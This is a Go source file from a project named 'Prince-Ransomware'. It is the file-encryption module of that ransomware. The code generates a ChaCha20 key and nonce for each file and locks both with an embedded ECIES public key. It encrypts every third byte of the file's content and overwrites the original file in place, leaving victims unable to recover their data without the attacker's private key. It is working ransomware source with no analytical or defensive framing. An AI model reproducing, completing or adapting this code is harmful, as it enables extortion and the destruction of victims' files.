package encryption

import (
	Configuration "Prince-Ransomware/configuration"
	"crypto/rand"
	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
	"io"
	"log"
	"os"
)

const (
	separator = "||" // Separator between encrypted key/nonce and file content
)

var (
	publicKey *eciesgo.PublicKey
	err       error
)

func init() {
	publicKey, err = eciesgo.NewPublicKeyFromHex(Configuration.PublicKey)
	if err != nil {
		panic(err)
	}
}

func generateKey() ([]byte, error) {
	key := make([]byte, chacha20.KeySize)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

func generateNonce() ([]byte, error) {
	nonce := make([]byte, chacha20.NonceSizeX)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return nonce, nil
}

func EncryptFile(filePath string) {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	// Generate the key and nonce
	key, err := generateKey()
	if err != nil {
		return
	}

	nonce, err := generateNonce()
	if err != nil {
		return
	}

	// Encrypt the key and nonce using RSA
	encryptedKey, err := eciesgo.Encrypt(publicKey, key)
	if err != nil {
		return
	}

	encryptedNonce, err := eciesgo.Encrypt(publicKey, nonce)
	if err != nil {
		return
	}

	// Create the cipher for ChaCha20 encryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}

	const chunkSize = 64 * 1024
	buffer := make([]byte, chunkSize)

	// Read and encrypt the file content
	var fileContent []byte
	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			return
		}

		if n == 0 {
			break
		}

		fileContent = append(fileContent, buffer[:n]...)
	}

	ciphertext := make([]byte, len(fileContent))
	for i := 0; i < len(fileContent); i += 3 {
		if i < len(fileContent) {
			cipher.XORKeyStream(ciphertext[i:i+1], fileContent[i:i+1])
		}
		if i+1 < len(fileContent) {
			ciphertext[i+1] = fileContent[i+1]
		}
		if i+2 < len(fileContent) {
			ciphertext[i+2] = fileContent[i+2]
		}
	}

	// Prepare the final data to write to the file
	finalData := append(encryptedKey, separator...)
	finalData = append(finalData, encryptedNonce...)
	finalData = append(finalData, separator...)
	finalData = append(finalData, ciphertext...)

	// Write the final data back to the file
	if err = file.Truncate(0); err != nil {
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		return
	}

	if _, err = file.Write(finalData); err != nil {
		return
	}

	log.Println("Encrypted file", filePath)

	return
}
